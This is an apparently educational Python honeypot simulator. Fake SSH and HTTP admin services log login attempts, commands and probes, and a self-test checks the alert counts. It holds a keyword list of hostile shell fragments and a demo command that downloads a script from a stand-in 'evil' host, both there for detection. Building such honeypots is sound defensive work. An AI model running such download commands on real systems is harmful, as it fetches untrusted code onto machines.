#!/usr/bin/env python3
"""
Honeypot simulator (educational).
Covers CPC H04L63/14 (deception / intrusion analysis): fake
services (SSH, HTTP admin) log every attacker interaction —
credentials tried, commands run — while the real system stays
untouched. High-interaction events raise immediate alerts.
"""
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class Honeypot:
    log: list = field(default_factory=list)
    alerts: list = field(default_factory=list)

    def _record(self, src, service, event, detail=""):
        entry = {"time": datetime.now().isoformat(timespec="seconds"),
                 "src": src, "service": service, "event": event, "detail": detail}
        self.log.append(entry)
        return entry

    def ssh_login(self, src, username, password):
        e = self._record(src, "ssh", "login_attempt", f"{username}/{password}")
        if username == "root":
            self.alerts.append(e)
            return "alert: root login attempt on honeypot"
        return "login failed (as always — it's a trap)"

    def ssh_command(self, src, cmd):
        e = self._record(src, "ssh", "command", cmd)
        dangerous = any(k in cmd for k in ("rm -rf", "wget", "curl", "nc ", "chmod +x"))
        if dangerous:
            self.alerts.append(e)
            return "alert: malicious command captured for analysis"
        return "fake shell output"

    def http_request(self, src, path):
        e = self._record(src, "http", "request", path)
        if path.startswith("/admin"):
            self.alerts.append(e)
            return "alert: admin panel probe"
        return "200 OK (fake)"


def demo():
    hp = Honeypot()
    print(hp.ssh_login("203.0.113.9", "root", "123456"))
    print(hp.ssh_login("203.0.113.9", "admin", "password"))
    print(hp.ssh_command("203.0.113.9", "wget http://evil/x.sh -O /tmp/x.sh"))
    print(hp.ssh_command("203.0.113.9", "ls -la"))
    print(hp.http_request("198.51.100.7", "/admin/config.php"))
    print(hp.http_request("198.51.100.7", "/index.html"))
    print(f"logged events: {len(hp.log)}, alerts: {len(hp.alerts)}")
    assert len(hp.log) == 6
    assert len(hp.alerts) == 3  # root login, wget, /admin probe
    creds = [e["detail"] for e in hp.log if e["event"] == "login_attempt"]
    print("captured credentials:", creds)
    print("Self-test: PASS")


if __name__ == "__main__":
    demo()
